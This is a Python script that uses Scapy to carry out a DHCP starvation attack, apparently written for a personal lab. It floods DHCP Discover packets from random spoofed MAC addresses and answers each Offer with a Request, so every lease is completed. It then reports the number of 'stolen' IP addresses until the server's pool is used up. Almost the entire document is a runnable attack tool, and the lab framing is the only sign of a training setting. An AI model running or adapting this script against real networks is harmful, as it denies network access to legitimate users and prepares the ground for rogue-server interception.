#!/usr/bin/env python3
"""
DHCP Starvation Attack
Autor  : Edgardy Olivero 20250704
Lab    : EGALDITO_LAB
Uso    : sudo python3 dhcp_starv.py
"""

from scapy.all import *
import random, time, sys, os, signal, threading

IFACE = "eth0.10"

leases = {}  # {xid: fake_mac}
confirmadas = [0]
stop_flag = threading.Event()


def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )


def send_discover(fake_mac):
    mb = bytes.fromhex(fake_mac.replace(":", "")).ljust(16, b"\x00")
    xid = random.randint(1, 0xFFFFFFFF)
    sendp(
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, chaddr=mb, xid=xid)
        / DHCP(options=[("message-type", "discover"), "end"]),
        iface=IFACE,
        verbose=False,
    )
    return xid


def send_request(fake_mac, offered_ip, server_ip, xid):
    mb = bytes.fromhex(fake_mac.replace(":", "")).ljust(16, b"\x00")
    sendp(
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, chaddr=mb, xid=xid)
        / DHCP(
            options=[
                ("message-type", "request"),
                ("requested_addr", offered_ip),
                ("server_id", server_ip),
                "end",
            ]
        ),
        iface=IFACE,
        verbose=False,
    )


def get_opt(pkt, name):
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and len(opt) >= 2 and opt[0] == name:
            return opt[1]
    return None


def response_handler(pkt):
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    tipo = get_opt(pkt, "message-type")

    if tipo == 2:  # Offer → responder con Request
        offered_ip = pkt[BOOTP].yiaddr
        server_ip = get_opt(pkt, "server_id") or "255.255.255.255"
        xid = pkt[BOOTP].xid
        fake_mac = leases.get(xid)
        if fake_mac:
            send_request(fake_mac, offered_ip, server_ip, xid)

    elif tipo == 5:  # ACK → IP robada confirmada
        ip = pkt[BOOTP].yiaddr
        confirmadas[0] += 1
        print(f"\r[+] IPs robadas: {confirmadas[0]}  última: {ip}", end="", flush=True)


# Hilo que escucha respuestas de R1
listener = threading.Thread(
    target=lambda: sniff(
        iface=IFACE,
        filter="udp port 68",
        prn=response_handler,
        store=False,
        stop_filter=lambda _: stop_flag.is_set(),
    ),
    daemon=True,
)


def cleanup(sig=None, frame=None):
    stop_flag.set()
    print(f"\n[+] Ataque detenido.")
    print(f"[+] IPs confirmadas robadas: {confirmadas[0]}")
    print(f"[+] Discovers enviados     : {len(leases)}")
    sys.exit(0)


if os.geteuid() != 0:
    sys.exit("Ejecutar como root.")

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

print("=" * 45)
print("  DHCP Starvation - Lab EGALDITO_LAB")
print(f"  Interfaz : {IFACE}")
print("  Ctrl+C para detener")
print("=" * 45 + "\n")

listener.start()
print("[*] Enviando Discovers con MACs falsas...\n")

count = 0
try:
    while not stop_flag.is_set():
        mac = rand_mac()
        xid = send_discover(mac)
        leases[xid] = mac
        count += 1
        time.sleep(0.1)
except KeyboardInterrupt:
    cleanup()
